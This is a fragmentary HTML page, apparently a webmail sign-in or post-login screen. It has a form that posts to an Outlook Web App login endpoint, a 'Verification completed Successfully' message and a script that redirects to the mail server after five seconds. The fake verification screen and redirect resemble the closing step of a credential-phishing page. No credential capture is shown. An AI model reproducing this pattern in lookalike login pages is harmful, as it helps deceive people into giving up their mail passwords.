...
<form action="https://east.exch031.serverdata.net/owa/auth.owa" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
...
width: 100px;
height: 100px;
background-color: #1b81cb; /* Green color for the circle background */
...
setTimeout(function() {
window.location.href = "https://east.exch031.serverdata.net";
}, 5000);
</script>
<br></br>
<center>
...
<br>
<h1 style="font-size: 16px; text-align: center; font-weight: bold;" id="page_title">Verification completed Successfully</h1>

        <p style="text-align: center; font-size: 11px;">We are logging you out...</p>
<br></br>
<br></br>
